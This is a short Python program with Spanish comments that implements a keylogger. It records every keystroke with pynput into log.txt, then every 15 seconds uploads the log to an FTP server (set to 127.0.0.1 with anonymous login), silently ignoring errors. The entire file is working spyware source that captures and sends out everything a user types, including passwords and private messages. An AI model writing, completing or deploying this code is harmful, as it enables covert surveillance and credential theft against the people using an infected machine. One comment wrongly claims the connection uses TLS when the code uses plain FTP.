import pynput.keyboard as keyboard
import ftplib
import threading
import datetime

class keyLog():

    def __init__(self, newFile):
        self.newFile = newFile
        with open(self.newFile, 'a') as logF:
            logF.write(str(datetime.datetime.now()) + '\n')
            logF.close()

    def processKeys(self, key):
        with open(self.newFile, "a") as log:  # Se guarda cada tecla pulsada. Las teclas con funciones se guardan en un formato específico para cada una.

            if key == keyboard.Key.space:
                log.write(" [SPACE] \n")
            elif key == keyboard.Key.enter:
                log.write(" [ENTER] \n")
            elif key == keyboard.Key.esc:
                log.write(" [ESC] \n")
            elif key == keyboard.Key.delete:
                log.write(" [DELETE] \n")
            elif key == keyboard.Key.tab:
                log.write(" [TAB] \n")
            elif key == keyboard.Key.up:
                log.write(" [UP ARROW] \n")
            elif key == keyboard.Key.right:
                log.write(" [RIGHT ARROW] \n")
            elif key == keyboard.Key.down:
                log.write(" [DOWN ARROW] \n")
            elif key == keyboard.Key.left:
                log.write(" [LEFT ARROW] \n")
            elif key == keyboard.Key.ctrl:
                log.write(" [CONTROL] \n")
            elif key == keyboard.Key.shift:
                log.write(" [SHIFT] \n")
            elif key == keyboard.Key.caps_lock:
                log.write(" [CAPS LOCK] \n")
            elif key == keyboard.Key.cmd:
                log.write(" [CMD] \n")
            elif key == keyboard.Key.backspace:
                log.write(" [BACKSPACE] \n")
            elif key == keyboard.Key.alt:
                log.write(" [ALT] \n")
            elif key == keyboard.Key.insert:
                log.write(" [INSERT] \n")

            else:
                log.write(str(key))

            log.close()

    def report(self):

        session = ftplib.FTP('127.0.0.1', 'anonymous', 'anonymous')  # Conexión a un servidor FTP con TLS mediante el usuario anonymous. Dejar sólo FTP en lugar de FTP_TLS para conexiones sin cifrar 
        session.encoding = "utf-8"

        try:
            with open(self.newFile,'rb') as fileU:
                session.storbinary(f'STOR pub/{self.newFile}', fileU)  # Se almacena log.txt en el directorio pub del servidor

            fileU.close()
            session.quit()

        except:
            pass

        timer = threading.Timer(15, self.report)  # Se rellama a la propia función de reporte cada 15 segundos
        timer.start()

    def start(self):

        keyListener = keyboard.Listener(on_press=self.processKeys)  # Se registran las teclas pulsadas y para cada tecla se llama a la función processKeys

        with keyListener:

            self.report()
            keyListener.join()

keyL = keyLog("log.txt")
keyL.start()
